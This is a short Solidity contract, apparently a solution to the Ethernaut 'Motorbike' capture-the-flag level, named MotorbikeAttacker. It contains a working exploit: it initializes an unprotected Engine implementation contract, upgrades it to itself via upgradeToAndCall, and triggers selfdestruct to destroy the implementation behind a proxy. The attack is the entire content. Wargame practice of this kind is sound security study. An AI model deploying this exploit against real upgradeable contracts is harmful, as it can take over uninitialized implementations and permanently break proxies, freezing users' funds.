// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import {Engine} from "@main-0_6_x/25_Motorbike.sol";

contract MotorbikeAttacker {

    function attack(Engine _engine) external {
        _engine.initialize();
        _engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(this.destroyEngine.selector)
        );
    }

    function destroyEngine() external {
        selfdestruct(payable(address(0)));
    }
}